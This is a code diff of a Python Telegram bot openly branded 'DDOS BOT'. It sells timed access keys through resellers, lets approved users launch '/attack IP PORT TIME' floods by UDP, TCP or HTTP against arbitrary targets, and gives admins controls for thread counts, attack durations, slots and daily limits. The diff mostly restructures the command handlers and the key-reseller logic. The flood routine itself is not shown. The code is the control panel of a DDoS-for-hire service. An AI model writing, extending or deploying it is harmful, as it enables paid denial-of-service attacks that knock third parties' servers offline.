-/limited ID TOKENS - Make reseller limited
-━━━━━━━━━━━━━━━━━━━━━━━━
-""")
-    elif is_reseller1(uid):
-        tokens = get_reseller_tokens1(uid)
-        keys_count = len(get_reseller_keys1(uid))
-        blocked_count = len(get_reseller_blocked_keys1(uid))
-        send_msg(TOKEN1, chat_id, f"""
-━━━━━━━━━━━━━━━━━━━━━━━━
-  ⚡ DDOS BOT STARTED ⚡ 
-━━━━━━━━━━━━━━━━━━━━━━━━
-  💼 RESELLER PANEL                  
-  🎫 Tokens: {tokens}
-  🔑 Keys Generated: {keys_count}
-  🚫 Blocked Keys: {blocked_count}
-━━━━━━━━━━━━━━━━━━━━━━━━
-📌 COMMANDS:                      
-⚔️ ATTACK:
-/attack IP PORT TIME - Start Attack
-/stop - Stop Attack
-━━━━━━━━━━━━━━━━━━━━━━━━
-👤 USER:
-/id - Get Your ID
-/redeem KEY - Redeem Access Key
-/help - Help Menu
-/rules - Bot Rules
-━━━━━━━━━━━━━━━━━━━━━━━━
-🔑 KEY MANAGEMENT:
-/genkey - Generate Keys
-/mykeys - Your keys
-/deletekey KEY - Delete your key
-/blockkey KEY - Block your key
-/unblockkey KEY - Unblock your key
-━━━━━━━━━━━━━━━━━━━━━━━━
-""")
-    else:
-        expiry = get_expiry(users1, uid)
-        send_msg(TOKEN1, chat_id, f"""
-━━━━━━━━━━━━━━━━━━━━━━━━
-  ⚡ DDOS BOT STARTED ⚡ 
-━━━━━━━━━━━━━━━━━━━━━━━━
-  ✅ APPROVED USER                  
-  📅 Expires: {expiry}          
-━━━━━━━━━━━━━━━━━━━━━━━━
-📌 COMMANDS:                      
-/attack IP PORT TIME - Start Attack
-/stop - Stop Attack
-/id - Get Your ID
-/redeem KEY - Redeem Access Key
-/help - Help Menu
-/rules - Bot Rules
-━━━━━━━━━━━━━━━━━━━━━━━━
-""")
+    VIDEO_FILE_ID = video_id
+    save()
+    send_msg(chat_id, "✅ Attack Video Saved!")
 
-def handle_attack_input1(chat_id, uid, text):
-    global is_attack, current_target
-    
-    parts = text.strip().split()
-    if len(parts) != 3:
-        send_msg(TOKEN1, chat_id, "❌ Send: IP PORT TIME\nExample: 1.2.3.4 80 30")
-        waiting_attack1[chat_id] = True
+def handle_delvideo(chat_id, uid):
+    global VIDEO_FILE_ID
+    if uid != ADMIN_ID:
+        send_msg(chat_id, "❌ Admin Only!")
         return
-    
-    ip, port, sec = parts[0], parts[1], parts[2]
-    try:
-        port = int(port)
-        sec = int(sec)
-        if sec < 5 or sec > attack_time:
-            send_msg(TOKEN1, chat_id, f"❌ Time must be 5-{attack_time} seconds")
-            waiting_attack1[chat_id] = True
-            return
-    except:
-        send_msg(TOKEN1, chat_id, "❌ Invalid port or time")
-        waiting_attack1[chat_id] = True
-        return
-    
-    can, msg = can_attack1(uid)
-    if not can:
-        send_msg(TOKEN1, chat_id, msg)
-        waiting_attack1[chat_id] = True
-        return
-    
-    if get_slots() <= 0:
-        send_msg(TOKEN1, chat_id, f"❌ ALL {MAX_SLOTS} SLOTS BUSY!")
-        waiting_attack1[chat_id] = True
-        return
-    
-    is_attack = True
-    current_target = f"{ip}:{port}"
-    add_slot()
-    add_attack_count1(uid)
-    method = random.choice(["UDP", "TCP", "HTTP"])
-    
-    msg_id = send_msg_and_get_id(TOKEN1, chat_id, f"""
-⚡ ATTACK STARTED ⚡
-━━━━━━━━━━━━━━━━━━━━━━
-🎯 Target: {ip}
-🔌 Port: {port}
-⏱️ Time: {sec}s
-🖥 SERVER    : {server_status}
-🚀 BANDWIDTH : {bandwidth}
-⚙️ METHOD    : {method}
-━━━━━━━━━━━━━━━━━━━━━━
-""")
-    if msg_id:
-        threading.Thread(target=run_progress, args=(TOKEN1, chat_id, msg_id, ip, port, sec, method)).start()
-    
-    waiting_attack1[chat_id] = False
+    VIDEO_FILE_ID = None
+    save()
+    send_msg(chat_id, "✅ Attack Video Deleted!")
 
-def handle_stop1(chat_id):
-    global is_attack
-    if is_attack:
-        is_attack = False
-        send_msg(TOKEN1, chat_id, "🛑 ATTACK STOPPED!")
-    else:
-        send_msg(TOKEN1, chat_id, "❌ No active attack!")
-
-def handle_id1(chat_id, uid):
-    if not is_user1(uid):
-        send_msg(TOKEN1, chat_id, f"🆔 ID: {uid}\n❌ Not Approved\nBuy: {CONTACT1}")
-        return
-    
-    if uid in ADMIN1:
-        send_msg(TOKEN1, chat_id, f"🆔 YOUR ID: {uid}\n👑 OWNER")
-    elif is_reseller1(uid):
-        tokens = get_reseller_tokens1(uid)
-        send_msg(TOKEN1, chat_id, f"🆔 YOUR ID: {uid}\n💼 RESELLER\n🎫 Tokens: {tokens}")
-    else:
-        expiry = get_expiry(users1, uid)
-        send_msg(TOKEN1, chat_id, f"🆔 YOUR ID: {uid}\n✅ Approved\n📅 Expires: {expiry}")
-
-def handle_redeem1(chat_id, text):
-    key = text.strip().upper()
-    success, msg = redeem_key1(chat_id, key)
-    send_msg(TOKEN1, chat_id, msg)
-
-def handle_rules1(chat_id):
-    send_msg(TOKEN1, chat_id, """
+def handle_rules(chat_id):
+    used = MAX_SLOTS - get_slots()
+    free = get_slots()
+    send_msg(chat_id, f"""
 ━━━━━━━━━━━━━━━━━━━━━━━━
 📜 BOT RULES
 ━━━━━━━━━━━━━━━━━━━━━━━━
@@ -880,389 +464,87 @@ def handle_rules1(chat_id):
 ━━━━━━━━━━━━━━━━━━━━━━━━
 """)
 
-def handle_help1(chat_id):
-    send_msg(TOKEN1, chat_id, """
+def handle_lock(chat_id, uid, args):
+    global is_locked
+    if uid != ADMIN_ID:
+        send_msg(chat_id, "❌ Admin only!")
+        return
+    is_locked = True
+    send_msg(chat_id, "🔒 Bot Locked!\n\nAll commands are currently disabled by admin.")
+
+def handle_unlock(chat_id, uid, args):
+    global is_locked
+    if uid != ADMIN_ID:
+        send_msg(chat_id, "❌ Admin only!")
+        return
+    is_locked = False
+    send_msg(chat_id, "🔓 Bot Unlocked!\n\nAll commands are now available.")
+
+def handle_unlimited(chat_id, uid, args):
+    if uid != ADMIN_ID:
+        send_msg(chat_id, "❌ Admin only!")
+        return
+    if len(args) != 1:
+        send_msg(chat_id, "Usage: /unlimited ID")
+        return
+    try:
+        rid = int(args[0])
+        if str(rid) in resellers:
+            resellers[str(rid)]['unlimited'] = True
+            resellers[str(rid)]['tokens'] = -1
+            save()
+            send_msg(chat_id, f"✅ Reseller {rid} now has UNLIMITED tokens!")
+        else:
+            send_msg(chat_id, "❌ Reseller not found!")
+    except:
+        send_msg(chat_id, "❌ Invalid!")
+
+def handle_limited(chat_id, uid, args):
+    if uid != ADMIN_ID:
+        send_msg(chat_id, "❌ Admin only!")
+        return
+    if len(args) != 2:
+        send_msg(chat_id, "Usage: /limited ID TOKENS")
+        return
+    try:
+        rid = int(args[0])
+        tokens = int(args[1])
+        if str(rid) in resellers:
+            resellers[str(rid)]['unlimited'] = False
+            resellers[str(rid)]['tokens'] = tokens
+            save()
+            send_msg(chat_id, f"✅ Reseller {rid} now has LIMITED tokens: {tokens}")
+        else:
+            send_msg(chat_id, "❌ Reseller not found!")
+    except:
+        send_msg(chat_id, "❌ Invalid!")
+
+def handle_start(chat_id, uid, cid):
+    if cid < 0:
+        if is_group(cid):
+            send_msg(chat_id, """
 ━━━━━━━━━━━━━━━━━━━━━━━━
-🔥 DDOS BOT HELP 🔥
+📌 GROUP COMMANDS!
 ━━━━━━━━━━━━━━━━━━━━━━━━
-USER COMMANDS:
-/attack IP PORT TIME - Start attack
-/stop - Stop attack
-/id - Your ID
-/redeem KEY - Redeem access key
-/help - This menu
-/rules - Bot rules
+/attack IP PORT TIME - Start Attack
+/stop - Stop Attack
+/id - Get Group ID
+/help - Help Menu
+/rules - Bot Rules
 ━━━━━━━━━━━━━━━━━━━━━━━━
-ADMIN COMMANDS:
-/adduser ID DAYS - Add user
-/removeuser ID - Remove user
-/addreseller ID TOKENS - Add reseller
-/removereseller ID - Remove reseller
-/setthreads NUM - Set threads
-/settime SEC - Set max time
-/setslots NUM - Set max slots
-/setcooldown SEC - Set cooldown
-/setdaily LIMIT - Set daily limit
-/gen PREFIX DURATION - Generate key
-/keys - List all keys
-/deletekeys - Delete all keys
-/blockkey KEY - Block key
-/unblockkey KEY - Unblock key
-/broadcast MSG - Broadcast message
-/lock - Lock bot
-/unlock - Unlock bot
-/unlimited ID - Make reseller unlimited
-/limited ID TOKENS - Make reseller limited
+""")
+        else:
+            send_msg(chat_id, """
 ━━━━━━━━━━━━━━━━━━━━━━━━
-RESELLER COMMANDS:
-/genkey - Generate key
-/mykeys - Your keys
-/deletekey KEY - Delete your key
-/blockkey KEY - Block your key
-/unblockkey KEY - Unblock your key
+❌ GROUP NOT APPROVED!
 ━━━━━━━━━━━━━━━━━━━━━━━━
-    """)
-
-def handle_adduser1(chat_id, text):
-    parts = text.strip().split()
-    if len(parts) != 2:
-        send_msg(TOKEN1, chat_id, "❌ Send: USER_ID DAYS\nExample: 123456789 7")
+Contact: @TG_DEVILOP
+━━━━━━━━━━━━━━━━━━━━━━━━
+""")
         return
-    try:
-        uid = int(parts[0])
-        days = int(parts[1])
-        if 1 <= days <= 30:
-            add_user1(uid, days)
-            send_msg(TOKEN1, chat_id, f"✅ User {uid} added for {days} days!")
-        else:
-            send_msg(TOKEN1, chat_id, "Days must be 1-30")
-    except:
-        send_msg(TOKEN1, chat_id, "Invalid input")
-
-def handle_removeuser1(chat_id, text):
-    try:
-        uid = int(text.strip())
-        remove_user1(uid)
-        send_msg(TOKEN1, chat_id, f"✅ User {uid} removed!")
-    except:
-        send_msg(TOKEN1, chat_id, "Invalid USER ID")
-
-def handle_addgroup1(chat_id, text):
-    parts = text.strip().split()
-    if len(parts) != 2:
-        send_msg(TOKEN1, chat_id, "❌ Send: GROUP_ID DAYS\nExample: -100123456789 7")
-        return
-    try:
-        gid = parts[0]
-        days = int(parts[1])
-        if 1 <= days <= 30:
-            add_group1(gid, days)
-            send_msg(TOKEN1, chat_id, f"✅ Group {gid} added for {days} days!")
-        else:
-            send_msg(TOKEN1, chat_id, "Days must be 1-30")
-    except:
-        send_msg(TOKEN1, chat_id, "Invalid input")
-
-def handle_removegroup1(chat_id, text):
-    try:
-        gid = text.strip()
-        remove_group1(gid)
-        send_msg(TOKEN1, chat_id, f"✅ Group {gid} removed!")
-    except:
-        send_msg(TOKEN1, chat_id, "Invalid GROUP ID")
-
-def handle_addreseller1(chat_id, text):
-    parts = text.strip().split()
-    if len(parts) != 2:
-        send_msg(TOKEN1, chat_id, "❌ Send: USER_ID TOKENS\nExample: 123456789 100")
-        return
-    try:
-        uid = int(parts[0])
-        tokens = int(parts[1])
-        add_reseller1(uid, tokens)
-        send_msg(TOKEN1, chat_id, f"✅ Reseller {uid} added with {tokens} tokens!")
-    except:
-        send_msg(TOKEN1, chat_id, "Invalid input")
-
-def handle_removereseller1(chat_id, text):
-    try:
-        uid = int(text.strip())
-        remove_reseller1(uid)
-        send_msg(TOKEN1, chat_id, f"✅ Reseller {uid} removed!")
-    except:
-        send_msg(TOKEN1, chat_id, "Invalid ID")
-
-def handle_setthreads1(chat_id, text):
-    global attack_threads
-    try:
-        threads = int(text.strip())
-        if 100 <= threads <= 5000:
-            attack_threads = threads
-            send_msg(TOKEN1, chat_id, f"✅ Threads set to {attack_threads}")
-        else:
-            send_msg(TOKEN1, chat_id, "Threads must be 100-5000")
-    except:
-        send_msg(TOKEN1, chat_id, "Invalid number")
-
-def handle_settime1(chat_id, text):
-    global attack_time
-    try:
-        time_sec = int(text.strip())
-        if 60 <= time_sec <= 600:
-            attack_time = time_sec
-            send_msg(TOKEN1, chat_id, f"✅ Max time set to {attack_time}s")
-        else:
-            send_msg(TOKEN1, chat_id, "Time must be 60-600 seconds")
-    except:
-        send_msg(TOKEN1, chat_id, "Invalid number")
-
-def handle_setslots1(chat_id, text):
-    global MAX_SLOTS
-    try:
-        slots = int(text.strip())
-        if 1 <= slots <= 200:
-            MAX_SLOTS = slots
-            send_msg(TOKEN1, chat_id, f"✅ Max slots set to {MAX_SLOTS}")
-        else:
-            send_msg(TOKEN1, chat_id, "Slots must be 1-200")
-    except:
-        send_msg(TOKEN1, chat_id, "Invalid number")
-
-def handle_setcooldown1(chat_id, text):
-    global cooldown_seconds
-    try:
-        cooldown = int(text.strip())
-        if 0 <= cooldown <= 600:
-            cooldown_seconds = cooldown
-            send_msg(TOKEN1, chat_id, f"✅ Cooldown set to {cooldown_seconds}s")
-        else:
-            send_msg(TOKEN1, chat_id, "Cooldown must be 0-600 seconds")
-    except:
-        send_msg(TOKEN1, chat_id, "Invalid number")
-
-def handle_setdaily1(chat_id, text):
-    global attack_daily_limit
-    try:
-        limit = int(text.strip())
-        if 1 <= limit <= 1000:
-            attack_daily_limit = limit
-            send_msg(TOKEN1, chat_id, f"✅ Daily limit set to {attack_daily_limit}")
-        else:
-            send_msg(TOKEN1, chat_id, "Limit must be 1-1000")
-    except:
-        send_msg(TOKEN1, chat_id, "Invalid number")
-
-def handle_gen1(chat_id, text):
-    parts = text.strip().split()
-    if len(parts) != 2:
-        send_msg(TOKEN1, chat_id, "Usage: /gen PREFIX DURATION\nExample: /gen ROLEX 7d")
-        return
-    prefix, duration = parts[0].upper(), parts[1].lower()
-    days, hours = 0, 0
-    if duration.endswith('d'):
-        days = int(duration[:-1])
-    elif duration.endswith('h'):
-        hours = int(duration[:-1])
-    else:
-        send_msg(TOKEN1, chat_id, "❌ Use 'd' for days or 'h' for hours")
-        return
-    key = generate_admin_key1(prefix, days, hours)
-    send_msg(TOKEN1, chat_id, f"✅ KEY GENERATED!\n🔑 {key}\n⏱️ Valid: {days}d" if days > 0 else f"✅ KEY GENERATED!\n🔑 {key}\n⏱️ Valid: {hours}h")
-
-def handle_keys1(chat_id):
-    if not keys1:
-        send_msg(TOKEN1, chat_id, "No keys available!")
-        return
-    unused = [f"🔑 {k} - {v['days']}d" if v['days'] > 0 else f"🔑 {k} - {v['hours']}h" for k, v in keys1.items() if not v.get('used', False) and not v.get('blocked', False)]
-    if unused:
-        send_msg(TOKEN1, chat_id, "📋 AVAILABLE KEYS:\n" + "\n".join(unused[:20]))
-    else:
-        send_msg(TOKEN1, chat_id, "No unused keys!")
-
-def handle_deletekeys1(chat_id):
-    keys1.clear()
-    save_keys1()
-    send_msg(TOKEN1, chat_id, "✅ All keys deleted!")
-
-def handle_blockkey1(chat_id, text):
-    key = text.strip().upper()
-    if key not in keys1:
-        send_msg(TOKEN1, chat_id, "❌ Key not found!")
-        return
-    if keys1[key].get('blocked', False):
-        send_msg(TOKEN1, chat_id, "❌ Key already blocked!")
-        return
-    creator = keys1[key].get('created_by', 'unknown')
-    add_blocked_key1(creator, key)
-    send_msg(TOKEN1, chat_id, f"✅ Key {key} blocked!")
-
-def handle_unblockkey1(chat_id, text):
-    key = text.strip().upper()
-    if not blocked_keys1.get(key, False):
-        send_msg(TOKEN1, chat_id, "❌ Key not blocked!")
-        return
-    remove_blocked_key1(key)
-    send_msg(TOKEN1, chat_id, f"✅ Key {key} unblocked!")
-
-def handle_broadcast1(chat_id, text):
-    msg = text.strip()
-    if not msg:
-        send_msg(TOKEN1, chat_id, "Send message to broadcast")
-        return
-    sent = 0
-    for uid in list(users1.keys()):
-        try:
-            send_msg(TOKEN1, int(uid), f"📢 BROADCAST:\n{msg}")
-            sent += 1
-        except:
-            pass
-    send_msg(TOKEN1, chat_id, f"✅ Broadcast sent to {sent} users")
-
-def handle_lock1(chat_id):
-    global is_locked1
-    is_locked1 = True
-    send_msg(TOKEN1, chat_id, "🔒 Bot Locked!")
-
-def handle_unlock1(chat_id):
-    global is_locked1
-    is_locked1 = False
-    send_msg(TOKEN1, chat_id, "🔓 Bot Unlocked!")
-
-def handle_unlimited1(chat_id, text):
-    try:
-        uid = int(text.strip())
-        if str(uid) in resellers1:
-            resellers1[str(uid)]['unlimited'] = True
-            resellers1[str(uid)]['tokens'] = -1
-            save_resellers1()
-            send_msg(TOKEN1, chat_id, f"✅ Reseller {uid} now has UNLIMITED tokens!")
-        else:
-            send_msg(TOKEN1, chat_id, "❌ Reseller not found!")
-    except:
-        send_msg(TOKEN1, chat_id, "❌ Invalid ID!")
-
-def handle_limited1(chat_id, text):
-    parts = text.strip().split()
-    if len(parts) != 2:
-        send_msg(TOKEN1, chat_id, "Usage: /limited ID TOKENS")
-        return
-    try:
-        uid = int(parts[0])
-        tokens = int(parts[1])
-        if str(uid) in resellers1:
-            resellers1[str(uid)]['unlimited'] = False
-            resellers1[str(uid)]['tokens'] = tokens
-            save_resellers1()
-            send_msg(TOKEN1, chat_id, f"✅ Reseller {uid} now has {tokens} tokens!")
-        else:
-            send_msg(TOKEN1, chat_id, "❌ Reseller not found!")
-    except:
-        send_msg(TOKEN1, chat_id, "Invalid input!")
-
-def handle_genkey_reseller1(chat_id, uid):
-    buttons = [
-        [{"text": "🕐 1 HOUR - 0 TOKENS", "callback_data": "genkey_1h"}],
-        [{"text": "🕐 12 HOURS - 2 TOKENS", "callback_data": "genkey_12h"}],
-        [{"text": "📅 1 DAY - 4 TOKENS", "callback_data": "genkey_1d"}],
-        [{"text": "📅 3 DAYS - 8 TOKENS", "callback_data": "genkey_3d"}],
-        [{"text": "📅 7 DAYS - 15 TOKENS", "callback_data": "genkey_7d"}],
-        [{"text": "📅 14 DAYS - 30 TOKENS", "callback_data": "genkey_14d"}],
-        [{"text": "📅 30 DAYS - 50 TOKENS", "callback_data": "genkey_30d"}],
-        [{"text": "❌ CANCEL", "callback_data": "genkey_cancel"}]
-    ]
-    send_inline_buttons(TOKEN1, chat_id, f"💼 SELECT KEY TYPE\n💰 Balance: {get_reseller_tokens1(uid)}", buttons)
-
-def handle_mykeys1(chat_id, uid):
-    keys_list = get_reseller_keys1(uid)
-    if not keys_list:
-        send_msg(TOKEN1, chat_id, "❌ No keys generated!")
-        return
-    msg = "🔑 YOUR GENERATED KEYS:\n\n" + "\n".join([f"• {k}" for k in keys_list])
-    send_msg(TOKEN1, chat_id, msg[:4000])
-
-def handle_deletekey_reseller1(chat_id, uid, text):
-    key = text.strip().upper()
-    if key not in keys1 or keys1[key].get('created_by') != str(uid):
-        send_msg(TOKEN1, chat_id, "❌ You can only delete keys you generated!")
-        return
-    if delete_key1(key):
-        send_msg(TOKEN1, chat_id, f"✅ Key {key} deleted!")
-    else:
-        send_msg(TOKEN1, chat_id, "❌ Key not found!")
-
-def handle_blockkey_reseller1(chat_id, uid, text):
-    key = text.strip().upper()
-    if key not in keys1 or keys1[key].get('created_by') != str(uid):
-        send_msg(TOKEN1, chat_id, "❌ You can only block keys you generated!")
-        return
-    add_blocked_key1(uid, key)
-    send_msg(TOKEN1, chat_id, f"✅ Key {key} blocked!")
-
-def handle_unblockkey_reseller1(chat_id, uid, text):
-    key = text.strip().upper()
-    if not blocked_keys1.get(key, False):
-        send_msg(TOKEN1, chat_id, "❌ Key not blocked!")
-        return
-    remove_blocked_key1(key)
-    send_msg(TOKEN1, chat_id, f"✅ Key {key} unblocked!")
-
-def handle_myblockedkeys1(chat_id, uid):
-    blocked = get_reseller_blocked_keys1(uid)
-    if not blocked:
-        send_msg(TOKEN1, chat_id, "❌ No blocked keys!")
-        return
-    msg = "🚫 YOUR BLOCKED KEYS:\n\n" + "\n".join([f"• {k}" for k in blocked])
-    send_msg(TOKEN1, chat_id, msg)
-
-def handle_resellers1(chat_id):
-    if not resellers1:
-        send_msg(TOKEN1, chat_id, "No resellers!")
-        return
-    msg = "💼 RESELLERS LIST:\n\n"
-    for rid, data in resellers1.items():
-        tokens = "∞" if data.get('unlimited', False) else data['tokens']
-        msg += f"🆔 {rid}\n💰 Tokens: {tokens}\n📈 Earned: {data['total_earned']}\n━━━━━━━━━━━━━━━━\n"
-    send_msg(TOKEN1, chat_id, msg[:4000])
-
-# ==================== BOT 2 FUNCTIONS (mirror) ====================
-def is_user2(uid):
-    if uid in ADMIN2:
-        return True
-    return str(uid) in users2 and time.time() < users2[str(uid)]
-
-def add_user2(uid, days):
-    users2[str(uid)] = time.time() + (days * 86400)
-    save_users2()
-
-def remove_user2(uid):
-    if str(uid) in users2:
-        del users2[str(uid)]
-        save_users2()
-
-def is_group2(gid):
-    return str(gid) in groups2 and time.time() < groups2[str(gid)]
-
-def add_group2(gid, days):
-    groups2[str(gid)] = time.time() + (days * 86400)
-    save_groups2()
-
-def remove_group2(gid):
-    if str(gid) in groups2:
-        del groups2[str(gid)]
-        save_groups2()
-
-def is_reseller2(uid):
-    return str(uid) in resellers2
-
-def get_reseller_keys2(uid):
-    return resellers2[str(uid)].get('keys_generated', []) if str(uid) in resellers2 else []
-
-def get_reseller_blocked_keys2(uid):
-    return resellers2[str(uid)].get('blocked_keys', []) if str(uid) in resellers2 else []
-
-def handle_start2(chat_id, uid):
-    if not is_user2(uid):
-        send_msg(TOKEN2, chat_id, f"""
+    
+    if not is_user(uid) and not is_reseller(uid):
+        send_msg(chat_id, """
 ━━━━━━━━━━━━━━━━━━━━━━━━
    ⚡ DDOS BOT STARTED ⚡ 
 ━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1271,53 +553,54 @@ You Are Not Approved!
 ━━━━━━━━━━━━━━━━━━━━━━━━
 🔑 /redeem KEY - Get Access
 ━━━━━━━━━━━━━━━━━━━━━━━━
-🔑 BUY ACCESS: {CONTACT2}
+Contact: @TG_DEVILOP         
 ━━━━━━━━━━━━━━━━━━━━━━━━
 """)
         return
     
-    if uid in ADMIN2:
-        send_msg(TOKEN2, chat_id, f"""
+    if uid == ADMIN_ID:
+        send_msg(chat_id, """
+━━━━━━━━━━━━━━━━━━━━━━━━  
+   ⚡ DDOS BOT STARTED ⚡    
 ━━━━━━━━━━━━━━━━━━━━━━━━
-     ⚡ DDOS BOT STARTED ⚡ 
+👤 USER COMMANDS:           
+/attack IP PORT TIME - Start Attack
+/stop - Stop Attack
+/id - Get Your ID
+/redeem KEY - Redeem Access Key
+/help - Help Menu
+/rules - Bot Rules
 ━━━━━━━━━━━━━━━━━━━━━━━━
-        👑 WELCOME ADMIN
-━━━━━━━━━━━━━━━━━━━━━━━━
-📌 USER COMMANDS:                      
-/attack IP PORT TIME - Start attack
-/stop - Stop attack
-/id - Your ID
-/redeem KEY - Redeem access key
-/help - This menu
-/rules - Bot rules
-━━━━━━━━━━━━━━━━━━━━━━━━
-👑 ADMIN COMMANDS:
-/adduser ID DAYS - Add user
-/removeuser ID - Remove user
-/addreseller ID TOKENS - Add reseller
-/removereseller ID - Remove reseller
-/setthreads NUM - Set threads
-/settime SEC - Set max time
-/setslots NUM - Set max slots
-/setcooldown SEC - Set cooldown
-/setdaily LIMIT - Set daily limit
-/gen PREFIX DURATION - Generate key
-/keys - List all keys
-/deletekeys - Delete all keys
-/blockkey KEY - Block key
-/unblockkey KEY - Unblock key
-/broadcast MSG - Broadcast message
-/lock - Lock bot
-/unlock - Unlock bot
-/unlimited ID - Make reseller unlimited
-/limited ID TOKENS - Make reseller limited
+👑 ADMIN COMMANDS:             
+/adduser ID DAYS - Add User
+/removeuser ID - Remove User
+/addgroup ID DAYS - Add Group
+/removegroup ID - Remove Group
+/setthreads NUM - Set Threads
+/settime SEC - Set Max Time
+/setslots NUM - Set Max Slots
+/setcooldown SEC - Set Cooldown
+/setdaily LIMIT - Set Daily Attack Limit
+/delvideo - Delete Attack Video
+/gen PREFIX DAYS/HOURS - Generate Key
+/keys - List All Keys
+/deletekeys - Delete Keys
+/addreseller ID TOKENS - Add Reseller
+/removereseller ID - Remove Reseller
+/resellers - List Resellers
+/blockkey KEY - Block Key
+/unblockkey KEY - Unblock Key
+/lock - Lock Bot (Admin Only)
+/unlock - Unlock Bot (Admin Only)
+/unlimited ID - Make Reseller Unlimited
+/limited ID TOKENS - Make Reseller Limited
 ━━━━━━━━━━━━━━━━━━━━━━━━
 """)
-    elif is_reseller2(uid):
-        tokens = get_reseller_tokens2(uid)
-        keys_count = len(get_reseller_keys2(uid))
-        blocked_count = len(get_reseller_blocked_keys2(uid))
-        send_msg(TOKEN2, chat_id, f"""
+    elif is_reseller(uid):
+        tokens = get_reseller_tokens(uid)
+        keys_count = len(get_reseller_keys(uid))
+        blocked_count = len(get_reseller_blocked_keys(uid))
+        send_msg(chat_id, f"""
 ━━━━━━━━━━━━━━━━━━━━━━━━
   ⚡ DDOS BOT STARTED ⚡ 
 ━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1330,24 +613,25 @@ You Are Not Approved!
 ⚔️ ATTACK:
 /attack IP PORT TIME - Start Attack
 /stop - Stop Attack
-━━━━━━━━━━━━━━━━━━━━━━━━
+
 👤 USER:
 /id - Get Your ID
 /redeem KEY - Redeem Access Key
 /help - Help Menu
 /rules - Bot Rules
-━━━━━━━━━━━━━━━━━━━━━━━━
+/commands - Show All Commands
+
 🔑 KEY MANAGEMENT:
 /genkey - Generate Keys
-/mykeys - Your keys
-/deletekey KEY - Delete your key
-/blockkey KEY - Block your key
-/unblockkey KEY - Unblock your key
+/deletekey - Delete Your Keys
+/blockkey KEY - Block Your Key
+/unblockkey KEY - Unblock Your Key
+/myblockedkeys - Show Your Blocked Keys
 ━━━━━━━━━━━━━━━━━━━━━━━━
 """)
     else:
-        expiry = get_expiry(users2, uid)
-        send_msg(TOKEN2, chat_id, f"""
+        expiry = get_user_expiry(uid)
+        send_msg(chat_id, f"""
 ━━━━━━━━━━━━━━━━━━━━━━━━
   ⚡ DDOS BOT STARTED ⚡ 
 ━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1364,395 +648,153 @@ You Are Not Approved!
 ━━━━━━━━━━━━━━━━━━━━━━━━
 """)
 
-def handle_attack_input2(chat_id, uid, text):
-    global is_attack, current_target
-    
-    parts = text.strip().split()
-    if len(parts) != 3:
-        send_msg(TOKEN2, chat_id, "❌ Send: IP PORT TIME\nExample: 1.2.3.4 80 30")
-        waiting_attack2[chat_id] = True
-        return
-    
-    ip, port, sec = parts[0], parts[1], parts[2]
-    try:
-        port = int(port)
-        sec = int(sec)
-        if sec < 5 or sec > attack_time:
-            send_msg(TOKEN2, chat_id, f"❌ Time must be 5-{attack_time} seconds")
-            waiting_attack2[chat_id] = True
-            return
-    except:
-        send_msg(TOKEN2, chat_id, "❌ Invalid port or time")
-        waiting_attack2[chat_id] = True
-        return
-    
-    can, msg = can_attack2(uid)
-    if not can:
-        send_msg(TOKEN2, chat_id, msg)
-        waiting_attack2[chat_id] = True
-        return
-    
-    if get_slots() <= 0:
-        send_msg(TOKEN2, chat_id, f"❌ ALL {MAX_SLOTS} SLOTS BUSY!")
-        waiting_attack2[chat_id] = True
-        return
-    
-    is_attack = True
-    current_target = f"{ip}:{port}"
-    add_slot()
-    add_attack_count2(uid)
-    method = random.choice(["UDP", "TCP", "HTTP"])
-    
-    msg_id = send_msg_and_get_id(TOKEN2, chat_id, f"""
-⚡ ATTACK STARTED ⚡
-━━━━━━━━━━━━━━━━━━━━━━
-🎯 Target: {ip}
-🔌 Port: {port}
-⏱️ Time: {sec}s
-🖥 SERVER    : {server_status}
-🚀 BANDWIDTH : {bandwidth}
-⚙️ METHOD    : {method}
-━━━━━━━━━━━━━━━━━━━━━━
-""")
-    if msg_id:
-        threading.Thread(target=run_progress, args=(TOKEN2, chat_id, msg_id, ip, port, sec, method)).start()
-    
-    waiting_attack2[chat_id] = False
-
-def handle_stop2(chat_id):
-    global is_attack
-    if is_attack:
-        is_attack = False
-        send_msg(TOKEN2, chat_id, "🛑 ATTACK STOPPED!")
-    else:
-        send_msg(TOKEN2, chat_id, "❌ No active attack!")
-
-def handle_id2(chat_id, uid):
-    if not is_user2(uid):
-        send_msg(TOKEN2, chat_id, f"🆔 ID: {uid}\n❌ Not Approved\nBuy: {CONTACT2}")
-        return
-    
-    if uid in ADMIN2:
-        send_msg(TOKEN2, chat_id, f"🆔 YOUR ID: {uid}\n👑 OWNER")
-    elif is_reseller2(uid):
-        tokens = get_reseller_tokens2(uid)
-        send_msg(TOKEN2, chat_id, f"🆔 YOUR ID: {uid}\n💼 RESELLER\n🎫 Tokens: {tokens}")
-    else:
-        expiry = get_expiry(users2, uid)
-        send_msg(TOKEN2, chat_id, f"🆔 YOUR ID: {uid}\n✅ Approved\n📅 Expires: {expiry}")
-
-def handle_redeem2(chat_id, text):
-    key = text.strip().upper()
-    success, msg = redeem_key2(chat_id, key)
-    send_msg(TOKEN2, chat_id, msg)
-
-def handle_rules2(chat_id):
-    send_msg(TOKEN2, chat_id, """
+def handle_help(chat_id, uid, cid):
+    if cid < 0:
+        if is_group(cid):
+            send_msg(chat_id, """
 ━━━━━━━━━━━━━━━━━━━━━━━━
-📜 BOT RULES
+📌 HELP - GROUP COMMANDS
 ━━━━━━━━━━━━━━━━━━━━━━━━
-1️⃣ RESPECT THE LIMITS
-   • Max 35 attacks per day
-   • Cooldown: 100 seconds between attacks
-
-2️⃣ NO SPAMMING
-   • Don't flood multiple attacks at once
-   • Don't stress test without permission
-
-3️⃣ BE RESPECTFUL
-   • Don't target unauthorized servers
-   • Only use on your own infrastructure
-
-4️⃣ NO SHARING
-   • Don't share your access key
-   • Each key is unique per user
-
-5️⃣ CONSEQUENCES
-   • Breaking rules = Permanent ban
-   • No refunds for banned users
+/attack IP PORT TIME - Start Attack
+/stop - Stop Attack
+/id - Get Group ID
+/help - Help Menu
+/rules - Bot Rules
 ━━━━━━━━━━━━━━━━━━━━━━━━
 """)
-
-def handle_help2(chat_id):
-    send_msg(TOKEN2, chat_id, """
+        else:
+            send_msg(chat_id, "❌ Group Not Approved!")
+        return
+    
+    if uid == ADMIN_ID:
+        send_msg(chat_id, """
 ━━━━━━━━━━━━━━━━━━━━━━━━
 🔥 DDOS BOT HELP 🔥
 ━━━━━━━━━━━━━━━━━━━━━━━━
